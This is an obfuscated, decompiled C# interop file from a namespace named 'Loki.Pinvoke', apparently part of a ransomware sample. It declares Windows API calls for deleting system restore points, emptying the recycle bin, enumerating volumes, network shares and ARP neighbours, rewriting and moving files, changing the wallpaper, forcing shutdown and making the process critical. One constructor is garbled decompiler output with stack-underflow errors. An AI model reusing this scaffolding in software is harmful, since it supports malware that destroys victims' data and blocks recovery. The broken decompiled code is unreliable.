using System;
using System.IO;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security;
using System.Text;

namespace Loki.Pinvoke;

internal class ZZZZZZZZK
{
	public enum ZZZZZZZZZZC
	{
		ERROR_SUCCESS = 0,
		S_OK = 0
	}

	public struct ZZZZZZZZZZD
	{
		public int ZZZZZZZZZZE;

		public int ZZZZZZZZZZF;

		public int ZZZZZZZZZZG;

		public int ZZZZZZZZZZH;
	}

	public enum ZZZZZZZZZZI
	{
		Tiled,
		Centered,
		Stretched
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	public struct ZZZZZZZZZZJ
	{
		public uint ZZZZZZZZZZK;

		public FILETIME ZZZZZZZZZZL;

		public FILETIME ZZZZZZZZZZM;

		public FILETIME ZZZZZZZZZZN;

		public uint ZZZZZZZZZZO;

		public uint ZZZZZZZZZZP;

		public uint ZZZZZZZZZZQ;

		public uint ZZZZZZZZZZR;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
		public string ZZZZZZZZZZS;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
		public string ZZZZZZZZZZT;
	}

	public struct ZZZZZZZZZZU
	{
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 16)]
		public string ZZZZZZZZZZV;
	}

	public struct ZZZZZZZZZZW
	{
		public IntPtr ZZZZZZZZZZX;

		public ZZZZZZZZZZU ZZZZZZZZZZY;

		public ZZZZZZZZZZU ZZZZZZZZZZZ;

		public int ZZZZZZZZZZZa;
	}

	public struct ZZZZZZZZZZZb
	{
		public IntPtr ZZZZZZZZZZZc;

		public int ZZZZZZZZZZZd;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
		public string ZZZZZZZZZZZe;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 132)]
		public string ZZZZZZZZZZZf;

		public uint ZZZZZZZZZZZg;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public byte[] ZZZZZZZZZZZh;

		public int ZZZZZZZZZZZi;

		public uint ZZZZZZZZZZZj;

		public uint ZZZZZZZZZZZk;

		public IntPtr ZZZZZZZZZZZl;

		public ZZZZZZZZZZW ZZZZZZZZZZZm;

		public ZZZZZZZZZZW ZZZZZZZZZZZn;

		public ZZZZZZZZZZW ZZZZZZZZZZZo;

		public bool ZZZZZZZZZZZp;

		public ZZZZZZZZZZW ZZZZZZZZZZZq;

		public ZZZZZZZZZZW ZZZZZZZZZZZr;

		public int ZZZZZZZZZZZs;

		public int ZZZZZZZZZZZt;
	}

	public enum ZZZZZZZZZZZu
	{
		RESOURCE_CONNECTED = 1,
		RESOURCE_GLOBALNET,
		RESOURCE_REMEMBERED,
		RESOURCE_RECENT,
		RESOURCE_CONTEXT
	}

	public enum ZZZZZZZZZZZv
	{
		RESOURCETYPE_ANY,
		RESOURCETYPE_DISK,
		RESOURCETYPE_PRINT,
		RESOURCETYPE_RESERVED
	}

	public enum ZZZZZZZZZZZw
	{
		RESOURCEUSAGE_CONNECTABLE = 1,
		RESOURCEUSAGE_CONTAINER = 2,
		RESOURCEUSAGE_NOLOCALDEVICE = 4,
		RESOURCEUSAGE_SIBLING = 8,
		RESOURCEUSAGE_ATTACHED = 16,
		RESOURCEUSAGE_ALL = 19
	}

	public enum ZZZZZZZZZZZx
	{
		RESOURCEDISPLAYTYPE_GENERIC,
		RESOURCEDISPLAYTYPE_DOMAIN,
		RESOURCEDISPLAYTYPE_SERVER,
		RESOURCEDISPLAYTYPE_SHARE,
		RESOURCEDISPLAYTYPE_FILE,
		RESOURCEDISPLAYTYPE_GROUP,
		RESOURCEDISPLAYTYPE_NETWORK,
		RESOURCEDISPLAYTYPE_ROOT,
		RESOURCEDISPLAYTYPE_SHAREADMIN,
		RESOURCEDISPLAYTYPE_DIRECTORY,
		RESOURCEDISPLAYTYPE_TREE,
		RESOURCEDISPLAYTYPE_NDSCONTAINER
	}

	[StructLayout(LayoutKind.Sequential)]
	public class ZZZZZZZZZZZy
	{
		public ZZZZZZZZZZZu ZZZZZZZZZZZz;

		public ZZZZZZZZZZZv ZZZZZZZZZZZA;

		public ZZZZZZZZZZZx ZZZZZZZZZZZB;

		public ZZZZZZZZZZZw ZZZZZZZZZZZC;

		public string ZZZZZZZZZZZD;

		public string ZZZZZZZZZZZE;

		public string ZZZZZZZZZZZF;

		public string ZZZZZZZZZZZG;

		public extern ZZZZZZZZZZZy();
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ZZZZZZZZZZZH
	{
		public string ZZZZZZZZZZZJ;

		public uint ZZZZZZZZZZZK;

		public string ZZZZZZZZZZZL;

		public ZZZZZZZZZZZH(string sharename, uint sharetype, string remark)
		{
			//Discarded unreachable code: IL_001d, IL_0023, IL_002c
			//IL_000b: Invalid comparison between F4 and O
			//IL_0013: Invalid comparison between Unknown and I8
			while (true)
			{
				if ((int)/*Error near IL_0005: Stack underflow*/ == 0 && (object)3.9918182E-20f == null)
				{
					long num = ((long[])/*Error near IL_0011: Stack underflow*/)[/*Error near IL_0011: Stack underflow*/];
					if ((long)/*Error near IL_0018: Stack underflow*/ <= num)
					{
						break;
					}
				}
			}
			/*Error near IL_0018: Invalid metadata token*/;
		}

		public override extern string ZZZZZZZZZZZI();
	}

	public enum ZZZZZZZZZZZM : uint
	{
		NERR_Success = 0u,
		NERR_BASE = 2100u,
		NERR_UnknownDevDir = 2116u,
		NERR_DuplicateShare = 2118u,
		NERR_BufTooSmall = 2123u
	}

	public enum ZZZZZZZZZZZN : uint
	{
		STYPE_DISKTREE = 0u,
		STYPE_PRINTQ = 1u,
		STYPE_DEVICE = 2u,
		STYPE_IPC = 3u,
		STYPE_SPECIAL = 2147483648u
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	public class ZZZZZZZZZZZO
	{
		public uint ZZZZZZZZZZZP;

		public uint ZZZZZZZZZZZQ;

		public ulong ZZZZZZZZZZZR;

		public ulong ZZZZZZZZZZZS;

		public ulong ZZZZZZZZZZZT;

		public ulong ZZZZZZZZZZZU;

		public ulong ZZZZZZZZZZZV;

		public ulong ZZZZZZZZZZZW;

		public ulong ZZZZZZZZZZZX;

		public extern ZZZZZZZZZZZO();
	}

	public const int ZZZZZZZZZV = 20;

	public const int ZZZZZZZZZW = 1;

	public const int ZZZZZZZZZX = 2;

	public const int ZZZZZZZZZY = 1;

	public const int ZZZZZZZZZZ = 2;

	public const int ZZZZZZZZZZa = 4;

	public static readonly IntPtr ZZZZZZZZZZb;

	public const uint ZZZZZZZZZZc = 1u;

	public const uint ZZZZZZZZZZd = 8u;

	public const uint ZZZZZZZZZZe = 64u;

	public const uint ZZZZZZZZZZf = 16u;

	public const uint ZZZZZZZZZZg = 4u;

	public const int ZZZZZZZZZZh = 0;

	public const int ZZZZZZZZZZi = 1;

	public const int ZZZZZZZZZZj = 3;

	public const int ZZZZZZZZZZk = 4;

	public const short ZZZZZZZZZZl = 0;

	public const short ZZZZZZZZZZm = 21;

	public const short ZZZZZZZZZZn = 70;

	public const short ZZZZZZZZZZo = 80;

	public const short ZZZZZZZZZZp = 443;

	public const short ZZZZZZZZZZq = 1080;

	public const int ZZZZZZZZZZr = 1;

	public const int ZZZZZZZZZZs = 2;

	public const int ZZZZZZZZZZt = 3;

	public const uint ZZZZZZZZZZu = uint.MaxValue;

	private const int ZZZZZZZZZZv = 8;

	private const int ZZZZZZZZZZw = 128;

	private const int ZZZZZZZZZZx = 256;

	public const int ZZZZZZZZZZy = 111;

	public const uint ZZZZZZZZZZz = uint.MaxValue;

	private const int ZZZZZZZZZZA = 0;

	public const int ZZZZZZZZZZB = 13369376;

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr FindFirstVolume([Out] StringBuilder stringBuilder_0, uint uint_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool FindNextVolume(IntPtr intptr_0, [Out] StringBuilder stringBuilder_0, uint uint_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeName(string string_0, IntPtr intptr_0, uint uint_0, out uint uint_1);

	[DllImport("kernel32.dll")]
	public static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool FindVolumeClose(IntPtr intptr_0);

	[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
	public static extern IntPtr memset(IntPtr intptr_0, int int_0, int int_1);

	[DllImport("SrClient.dll", SetLastError = true)]
	public static extern uint SRRemoveRestorePoint(uint uint_0);

	[DllImport("Kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	public static extern bool SetVolumeLabelA(string string_0, string string_1);

	[DllImport("user32.dll")]
	public static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool GetWindowRect(IntPtr intptr_0, out ZZZZZZZZZZD zzzzzzzzzzd_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern bool SystemParametersInfo(int int_0, int int_1, string string_0, int int_2);

	[DllImport("shell32.dll")]
	public static extern int SHEmptyRecycleBin(IntPtr intptr_0, string string_0, uint uint_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr FindFirstFile(string string_0, out ZZZZZZZZZZJ zzzzzzzzzzj_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern bool FindNextFile(IntPtr intptr_0, out ZZZZZZZZZZJ zzzzzzzzzzj_0);

	[DllImport("kernel32.dll")]
	public static extern bool FindClose(IntPtr intptr_0);

	[DllImport("Shlwapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern IntPtr PathFindExtensionW(string string_0);

	[DllImport("Shlwapi.dll", CharSet = CharSet.Unicode)]
	public static extern IntPtr PathFindFileNameW(string string_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern IntPtr CreateFileW([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.U4)] FileAccess fileAccess_0, [MarshalAs(UnmanagedType.U4)] FileShare fileShare_0, IntPtr intptr_0, [MarshalAs(UnmanagedType.U4)] FileMode fileMode_0, [MarshalAs(UnmanagedType.U4)] FileAttributes fileAttributes_0, IntPtr intptr_1);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool GetFileSizeEx(IntPtr intptr_0, out long long_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool ReadFile(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, out uint uint_1, IntPtr intptr_2);

	[DllImport("kernel32.dll", SetLastError = true)]
	[ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
	[SuppressUnmanagedCodeSecurity]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool CloseHandle(IntPtr intptr_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
	public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string string_0);

	[DllImport("kernel32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool WriteFile(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, out uint uint_1, IntPtr intptr_2);

	[DllImport("kernel32.dll", EntryPoint = "WriteFile")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool WriteFile_1(IntPtr intptr_0, byte[] byte_0, uint uint_0, out uint uint_1, IntPtr intptr_1);

	[DllImport("kernel32.dll")]
	public static extern bool SetFilePointerEx(IntPtr intptr_0, long long_0, IntPtr intptr_1, uint uint_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool MoveFileW(string string_0, string string_1);

	[DllImport("kernel32.dll")]
	public static extern long GetVolumeInformation(string string_0, StringBuilder stringBuilder_0, uint uint_0, ref uint uint_1, ref uint uint_2, ref uint uint_3, StringBuilder stringBuilder_1, uint uint_4);

	[DllImport("shlwapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool PathFileExistsW([MarshalAs(UnmanagedType.LPTStr)] string string_0);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern uint InitiateShutdown(string string_0, string string_1, uint uint_0, uint uint_1, uint uint_2);

	[DllImport("user32.dll")]
	public static extern IntPtr CreateDesktop(string string_0, IntPtr intptr_0, IntPtr intptr_1, int int_0, uint uint_0, IntPtr intptr_2);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int MessageBox(IntPtr intptr_0, string string_0, string string_1, uint uint_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern uint GetFileAttributesW(string string_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern uint GetModuleFileName([In] IntPtr intptr_0, [Out] StringBuilder stringBuilder_0, [In][MarshalAs(UnmanagedType.U4)] int int_0);

	[DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr InternetOpen(string string_0, int int_0, string string_1, string string_2, int int_1);

	[DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr InternetConnect(IntPtr intptr_0, string string_0, short short_0, string string_1, string string_2, int int_0, int int_1, IntPtr intptr_1);

	[DllImport("wininet.dll", SetLastError = true)]
	public static extern IntPtr HttpOpenRequest(IntPtr intptr_0, string string_0, string string_1, string string_2, string string_3, string[] string_4, int int_0, IntPtr intptr_1);

	[DllImport("wininet.dll", SetLastError = true)]
	public static extern bool HttpSendRequest([In] IntPtr intptr_0, [In] string string_0, [In] uint uint_0, [In] IntPtr intptr_1, [In] uint uint_1);

	[DllImport("wininet.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool InternetReadFile(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, out uint uint_1);

	[DllImport("wininet.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool InternetCloseHandle(IntPtr intptr_0);

	[DllImport("Kernel32.dll")]
	public static extern bool QueryFullProcessImageName([In] IntPtr intptr_0, [In] uint uint_0, [Out] StringBuilder stringBuilder_0, [In][Out] ref uint uint_1);

	[DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr CreateThread(IntPtr intptr_0, uint uint_0, Action action_0, IntPtr intptr_1, uint uint_1, out uint uint_2);

	[DllImport("kernel32.dll")]
	public static extern uint WaitForMultipleObjects(uint uint_0, IntPtr[] intptr_0, bool bool_0, uint uint_1);

	[DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr ShellExecute(IntPtr intptr_0, string string_0, string string_1, string string_2, string string_3, int int_0);

	[DllImport("iphlpapi.dll", CharSet = CharSet.Ansi)]
	public static extern int GetAdaptersInfo(IntPtr intptr_0, ref long long_0);

	[DllImport("iphlpapi.dll", ExactSpelling = true)]
	public static extern int SendARP(uint uint_0, uint uint_1, byte[] byte_0, ref int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern uint WaitForSingleObject(IntPtr intptr_0, uint uint_0);

	[DllImport("mpr.dll")]
	public static extern int WNetAddConnection2(ZZZZZZZZZZZy zzzzzzzzzzzy_0, string string_0, string string_1, int int_0);

	[DllImport("Netapi32.dll", SetLastError = true)]
	public static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	public static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	[DllImport("mpr.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int WNetGetConnection([MarshalAs(UnmanagedType.LPTStr)] string string_0, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder stringBuilder_0, ref int int_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GlobalMemoryStatusEx([In][Out] ZZZZZZZZZZZO zzzzzzzzzzzo_0);

	[DllImport("shell32.dll")]
	public static extern void SHChangeNotify(int int_0, uint uint_0, IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)] string string_0);

	[DllImport("gdi32.dll")]
	public static extern bool BitBlt(IntPtr intptr_0, int int_0, int int_1, int int_2, int int_3, IntPtr intptr_1, int int_4, int int_5, int int_6);

	[DllImport("gdi32.dll")]
	public static extern IntPtr CreateCompatibleBitmap(IntPtr intptr_0, int int_0, int int_1);

	[DllImport("gdi32.dll")]
	public static extern IntPtr CreateCompatibleDC(IntPtr intptr_0);

	[DllImport("gdi32.dll")]
	public static extern bool DeleteDC(IntPtr intptr_0);

	[DllImport("gdi32.dll")]
	public static extern bool DeleteObject(IntPtr intptr_0);

	[DllImport("gdi32.dll")]
	public static extern IntPtr SelectObject(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("user32.dll")]
	public static extern IntPtr GetWindowDC(IntPtr intptr_0);

	[DllImport("user32.dll")]
	public static extern IntPtr ReleaseDC(IntPtr intptr_0, IntPtr intptr_1);

	public extern ZZZZZZZZK();
}
